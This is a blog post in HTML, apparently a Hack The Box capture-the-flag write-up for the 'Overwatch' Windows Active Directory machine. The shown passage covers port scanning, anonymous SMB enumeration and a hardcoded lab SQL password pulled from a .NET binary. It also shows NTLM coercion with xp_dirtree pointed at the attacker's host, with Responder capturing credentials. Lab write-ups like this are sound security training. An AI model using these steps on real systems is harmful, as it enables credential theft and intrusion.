@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/05/11/hackthebox-overwatch/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewOverwatch is a medium-difficulty Windows Active Directory machine from Hack The Box: anonymous SMB share leaks a .NET monitoring binary → reverse it to extract a SQL connection string for sqls">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Overwatch">
+<meta property="og:url" content="http://fouedsaidi.com/2026/05/11/Hackthebox-Overwatch/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewOverwatch is a medium-difficulty Windows Active Directory machine from Hack The Box: anonymous SMB share leaks a .NET monitoring binary → reverse it to extract a SQL connection string for sqls">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Overwatch/Overwatch.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Overwatch/connectionstring.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Overwatch/killprocess.png">
+<meta property="article:published_time" content="2026-05-11T16:35:10.000Z">
+<meta property="article:modified_time" content="2026-05-11T18:06:46.169Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Overwatch/Overwatch.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Overwatch -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Overwatch</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-11 19:35:10</span>
+        <span class="mobile">2026-05-11 19:35:10</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-11 21:06:46</span>
+            <span class="mobile">2026-05-11 21:06:46</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Overwatch is a medium-difficulty Windows Active Directory machine from Hack The Box: anonymous SMB share leaks a .NET monitoring binary → reverse it to extract a SQL connection string for <code>sqlsvc</code> → coerce NTLM auth with <code>xp_dirtree</code> and intercept linked-server cleartext to grab <code>sqlmgmt</code> creds → WinRM as <code>sqlmgmt</code> for user flag → chisel port-forward the internal SOAP monitoring service → command injection in <code>KillProcess</code> → reverse shell as <code>NT AUTHORITY\SYSTEM</code> for root.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Overwatch/Overwatch.png"
+                      alt="Overwatch-info-card"
+                ><figcaption>Overwatch-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  tcpwrapped</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-27 03:53:37Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2026-01-27T03:54:56+00:00; +2s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: OVERWATCH</span><br><span class="line">|   NetBIOS_Domain_Name: OVERWATCH</span><br><span class="line">|   NetBIOS_Computer_Name: S200401</span><br><span class="line">|   DNS_Domain_Name: overwatch.htb</span><br><span class="line">|   DNS_Computer_Name: S200401.overwatch.htb</span><br><span class="line">|   DNS_Tree_Name: overwatch.htb</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2026-01-27T03:54:17+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=S200401.overwatch.htb</span><br><span class="line">| Not valid before: 2025-12-07T15:16:06</span><br><span class="line">|_Not valid after:  2026-06-08T15:16:06</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2026-01-27T03:54:20</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 0s, median: 1s</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>This is a classic Windows DC: Kerberos on 88, LDAP on 389&#x2F;636, SMB on 445 and WinRM on 5985. Let’s start with SMB since it usually allows the cheapest enumeration.</p>
+<h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>Anonymous listing works against the host and we get a non-default <code>software$</code> share:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ smbclient -L  //10.129.13.144/ -N          </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share </span><br><span class="line">        software$       Disk      </span><br><span class="line">        SYSVOL          Disk      Logon server share </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.129.13.144 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ smbclient   //10.129.13.144/software$ -N</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                  DH        0  Fri May 16 21:27:07 2025</span><br><span class="line">  ..                                DHS        0  Thu Jan  1 01:46:47 2026</span><br><span class="line">  Monitoring                         DH        0  Fri May 16 21:32:43 2025</span><br><span class="line"></span><br><span class="line">                7147007 blocks of size 4096. 1760684 blocks available</span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> Monitoring</span><br><span class="line">smb: \Monitoring\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                  DH        0  Fri May 16 21:32:43 2025</span><br><span class="line">  ..                                 DH        0  Fri May 16 21:27:07 2025</span><br><span class="line">  EntityFramework.dll                AH  4991352  Thu Apr 16 16:38:42 2020</span><br><span class="line">  EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 16:38:56 2020</span><br><span class="line">  EntityFramework.SqlServer.xml      AH   163193  Thu Apr 16 16:38:56 2020</span><br><span class="line">  EntityFramework.xml                AH  3738289  Thu Apr 16 16:38:40 2020</span><br><span class="line">  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 10:46:10 2017</span><br><span class="line">  overwatch.exe                      AH     9728  Fri May 16 21:19:24 2025</span><br><span class="line">  overwatch.exe.config               AH     2163  Fri May 16 21:02:30 2025</span><br><span class="line">  overwatch.pdb                      AH    30208  Fri May 16 21:19:24 2025</span><br><span class="line">  System.Data.SQLite.dll             AH   450232  Sun Sep 29 16:41:18 2024</span><br><span class="line">  System.Data.SQLite.EF6.dll         AH   206520  Sun Sep 29 16:40:06 2024</span><br><span class="line">  System.Data.SQLite.Linq.dll        AH   206520  Sun Sep 29 16:40:42 2024</span><br><span class="line">  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 14:48:00 2024</span><br><span class="line">  System.Management.Automation.dll     AH   360448  Mon Jul 17 10:46:10 2017</span><br><span class="line">  System.Management.Automation.xml     AH  7145771  Mon Jul 17 10:46:10 2017</span><br><span class="line">  x64                                DH        0  Fri May 16 21:32:33 2025</span><br><span class="line">  x86                                DH        0  Fri May 16 21:32:33 2025</span><br><span class="line"></span><br><span class="line">                7147007 blocks of size 4096. 1760684 blocks available</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>A .NET monitoring program with a <code>.pdb</code> and <code>EntityFramework</code>&#x2F;<code>SQLite</code> deps. Let’s pull the whole <code>Monitoring</code> folder down:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/overwatch]</span><br><span class="line">└─$ smbget --recursive smb://10.129.13.144/software$/Monitoring -N</span><br><span class="line">Using domain: WORKGROUP, user: kali</span><br><span class="line">smb://10.129.13.144/software$/Monitoring/EntityFramework.dll                                                                                                                                                                                </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/EntityFramework.SqlServer.dll                                                                                                                                                                      </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/EntityFramework.SqlServer.xml                                                                                                                                                                      </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/EntityFramework.xml                                                                                                                                                                                </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/Microsoft.Management.Infrastructure.dll                                                                                                                                                            </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/overwatch.exe                                                                                                                                                                                      </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/overwatch.exe.config                                                                                                                                                                               </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/overwatch.pdb                                                                                                                                                                                      </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/System.Data.SQLite.dll                                                                                                                                                                             </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/System.Data.SQLite.EF6.dll                                                                                                                                                                         </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/System.Data.SQLite.Linq.dll                                                                                                                                                                        </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/System.Data.SQLite.xml                                                                                                                                                                             </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/System.Management.Automation.dll                                                                                                                                                                   </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/System.Management.Automation.xml                                                                                                                                                                   </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/x64/SQLite.Interop.dll                                                                                                                                                                             </span><br><span class="line">smb://10.129.13.144/software$/Monitoring/x86/SQLite.Interop.dll                                                                                                                                                                             </span><br><span class="line">Downloaded 21.72MB <span class="keyword">in</span> 210 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Reversing-the-NET-Binary"><a href="#Reversing-the-NET-Binary" class="headerlink" title="Reversing the .NET Binary"></a>Reversing the .NET Binary</h2><p><code>overwatch.exe</code> is a .NET assembly so we can throw it into dnSpy and read it cleanly. Inside the <code>MonitoringService</code> class we find a hardcoded SQL connection string:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Overwatch/connectionstring.png"
+                      alt="overwatch-connection-string"
+                ><figcaption>overwatch-connection-string</figcaption></figure></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;</span><br></pre></td></tr></table></figure></div>
+
+<p>So we have valid credentials for <code>sqlsvc</code> against the MSSQL instance running locally on the box. The catch is that MSSQL isn’t exposed externally, only via the monitoring binary — so we’ll need to reach SQL Server another way.</p>
+<h2 id="NTLM-Coercion-Linked-Server-Capture"><a href="#NTLM-Coercion-Linked-Server-Capture" class="headerlink" title="NTLM Coercion + Linked-Server Capture"></a>NTLM Coercion + Linked-Server Capture</h2><p>Connecting to MSSQL through impacket’s <code>mssqlclient.py</code> as <code>sqlsvc</code>, we get a shell on the master DB. Two interesting things show up: <code>xp_dirtree</code> is callable (lets us coerce NTLM authentication to an arbitrary host) and there is a <code>sql07</code> linked server configured on this instance.</p>
+<p>We point <code>xp_dirtree</code> at our box to collect the machine account NetNTLMv2 hash, and at the same time set up Responder so when MSSQL tries to negotiate the linked server connection we can capture credentials in cleartext as well:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SQL (OVERWATCH\sqlsvc  guest@master)&gt; xp_dirtree \\10.10.16.79\test</span><br><span class="line">subdirectory   depth   file   </span><br><span class="line">------------   -----   ----   </span><br><span class="line">SQL (OVERWATCH\sqlsvc  guest@master)&gt; use_link sql07</span><br><span class="line">INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider &quot;MSOLEDBSQL&quot; for linked server &quot;sql07&quot; returned message &quot;Communication link failure&quot;.</span><br><span class="line">ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.</span><br><span class="line"></span><br><span class="line">SQL (OVERWATCH\sqlsvc  guest@master)&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Responder picks up both: the machine account NetNTLMv2 challenge (not very useful here without cracking) and — more importantly — the linked-server credentials in cleartext because MSSQL stores linked server logins in a reversible format and presents them during the handshake:</p>
